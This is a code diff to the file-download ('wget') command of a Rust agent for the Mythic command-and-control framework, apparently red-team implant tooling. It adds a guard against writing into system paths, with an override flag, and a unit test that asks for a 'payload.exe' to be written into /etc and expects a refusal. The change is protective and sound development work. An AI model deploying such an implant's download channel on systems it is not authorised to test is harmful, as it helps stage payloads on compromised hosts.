@@ -11,8 +11,8 @@ use std::path::Path;
 use mythic::{TaskMessage, TaskResponse};
 use serde::Deserialize;
 
+use crate::common::pathguard::{display_path, is_protected_path, normalize_user_path};
 use crate::sys::network::http_get_to_writer;
-use crate::common::pathguard::{display_path, normalize_user_path};
 
 /// Hard cap on a single wget response. Larger transfers should use a
 /// stager split into multiple wget calls. 256 MiB mirrors `upload`.
@@ -30,6 +30,9 @@ struct Params {
     /// self-signed C2 certs; set false in monitored networks).
     #[serde(default = "default_true")]
     insecure_skip_tls_verify: bool,
+    /// When true, allows writing into protected system paths.
+    #[serde(default)]
+    allow_system_path: bool,
 }
 
 fn default_true() -> bool {
@@ -63,16 +66,25 @@ pub fn handle(task: &TaskMessage) -> TaskResponse {
         Path::new(&normalize_user_path(&params.path)).to_path_buf()
     };
 
+    if !params.allow_system_path && is_protected_path(&display_path(&dest)) {
+        return TaskResponse::failed(
+            task.id,
+            &format!(
+                "refusing write to system path {}; set allow_system_path=true to override",
+                display_path(&dest)
+            ),
+        );
+    }
+
     // Create parent dirs
-    if let Some(parent) = dest.parent() {
-        if !parent.as_os_str().is_empty() {
-            if let Err(e) = std::fs::create_dir_all(parent) {
-                return TaskResponse::failed(
-                    task.id,
-                    &format!("create parent dir {} failed: {e}", display_path(parent)),
-                );
-            }
-        }
+    if let Some(parent) = dest.parent()
+        && !parent.as_os_str().is_empty()
+        && let Err(e) = std::fs::create_dir_all(parent)
+    {
+        return TaskResponse::failed(
+            task.id,
+            &format!("create parent dir {} failed: {e}", display_path(parent)),
+        );
     }
 
     // 2. Stream the body to disk. If the response fails midway, clean up
@@ -108,7 +120,10 @@ pub fn handle(task: &TaskMessage) -> TaskResponse {
 
     if let Err(e) = std::io::Write::flush(&mut writer) {
         let _ = std::fs::remove_file(&dest);
-        return TaskResponse::failed(task.id, &format!("flush {} failed: {e}", display_path(&dest)));
+        return TaskResponse::failed(
+            task.id,
+            &format!("flush {} failed: {e}", display_path(&dest)),
+        );
     }
 
     TaskResponse {
@@ -122,5 +137,30 @@ pub fn handle(task: &TaskMessage) -> TaskResponse {
             n
         )),
         ..Default::default()
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn test_wget_refuses_system_destination_before_network() {
+        let task = TaskMessage {
+            command: "wget".into(),
+            parameters: serde_json::json!({
+                "url": "http://127.0.0.1:1/payload.exe",
+                "path": "/etc/nanaz_wget_test",
+            })
+            .to_string(),
+            ..Default::default()
+        };
+        let resp = handle(&task);
+        assert_eq!(resp.status.as_deref(), Some("error"));
+        assert!(
+            resp.user_output
+                .unwrap_or_default()
+                .contains("refusing write to system path")
+        );
     }
 }
